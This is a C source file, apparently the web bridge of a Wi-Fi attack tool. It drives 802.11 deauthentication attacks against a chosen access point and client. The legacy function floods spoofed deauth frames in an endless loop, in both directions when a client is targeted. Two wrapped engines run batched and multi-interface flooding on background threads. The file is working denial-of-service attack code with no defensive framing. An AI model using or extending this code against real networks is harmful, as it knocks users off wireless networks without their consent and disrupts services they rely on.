#include "web_bridge.h"
#include "packet_injector.h"
#include "deauth_engine.h"
#include "deauth_engine_v1.h"
#include "deauth_engine_v2.h"
#include "oui_lookup.h"
#include <stdio.h>
#include <string.h>
#include <pthread.h>

// ── Original deauth (legacy) ──

int web_send_deauth(const char* iface, const char* bssid, const char* station, int reason) {
    if (!iface || !bssid) return 0;
    uint8_t b[6], s[6];
    int bn = 0, sn = 0;
    const char* p = bssid;
    while (*p && bn < 6) {
        unsigned int v;
        if (sscanf(p, "%2x", &v) == 1) b[bn++] = (uint8_t)v;
        while (*p && *p != ':') p++;
        if (*p == ':') p++;
    }
    p = station ? station : "FF:FF:FF:FF:FF:FF";
    while (*p && sn < 6) {
        unsigned int v;
        if (sscanf(p, "%2x", &v) == 1) s[sn++] = (uint8_t)v;
        while (*p && *p != ':') p++;
        if (*p == ':') p++;
    }
    if (bn < 6 || sn < 6) return 0;

    bool targeted = memcmp(s, "\xff\xff\xff\xff\xff\xff", 6) != 0;
    int seq = 0;
    int sent = 0;
    for (;;) {
        for (int i = 0; i < 50; i++) {
            hackit_inject_deauth(iface, b, s, reason);
            sent++;
            if (targeted) {
                hackit_inject_deauth(iface, s, b, reason);
                sent++;
            }
        }
        fprintf(stderr, "\r[C] Deauth %s: %d sent", bssid, sent);
    }
    return 1;
}

// ── V1 Engine: batched sendmmsg ──

static DeauthEngineV1* g_v1 = NULL;
static pthread_t g_v1_thread;
static volatile int g_v1_running = 0;

static void* _v1_thread_fn(void* arg) {
    DeauthEngineV1* eng = (DeauthEngineV1*)arg;
    deauth_v1_run(eng);
    return NULL;
}

int web_deauth_v1_start(const char* iface, const char* bssid, const char* station, int reason) {
    if (g_v1) web_deauth_v1_stop();
    g_v1 = deauth_v1_create(iface, bssid, station, (uint16_t)reason);
    if (!g_v1) return -1;
    g_v1_running = 1;
    pthread_create(&g_v1_thread, NULL, _v1_thread_fn, g_v1);
    return 0;
}

void web_deauth_v1_stop(void) {
    if (g_v1) {
        deauth_v1_stop(g_v1);
        pthread_join(g_v1_thread, NULL);
        deauth_v1_destroy(g_v1);
        g_v1 = NULL;
    }
    g_v1_running = 0;
}

long long web_deauth_v1_sent(void) {
    return g_v1 ? g_v1->sent : 0;
}

// ── V2 Engine: multi-interface ──

static DeauthEngineV2* g_v2 = NULL;
static pthread_t g_v2_thread;

static void* _v2_thread_fn(void* arg) {
    DeauthEngineV2* eng = (DeauthEngineV2*)arg;
    deauth_v2_run(eng);
    return NULL;
}

int web_deauth_v2_start(const char* ifaces[], int count, const char* bssid, const char* station, int reason) {
    if (g_v2) { deauth_v2_stop(g_v2); pthread_join(g_v2_thread, NULL); deauth_v2_destroy(g_v2); g_v2 = NULL; }
    g_v2 = deauth_v2_create(ifaces, count, bssid, station, (uint16_t)reason);
    if (!g_v2) return -1;
    pthread_create(&g_v2_thread, NULL, _v2_thread_fn, g_v2);
    return 0;
}

void web_deauth_v2_stop(void) {
    if (g_v2) {
        deauth_v2_stop(g_v2);
        pthread_join(g_v2_thread, NULL);
        deauth_v2_destroy(g_v2);
        g_v2 = NULL;
    }
}

long long web_deauth_v2_total(void) {
    return g_v2 ? g_v2->total_sent : 0;
}
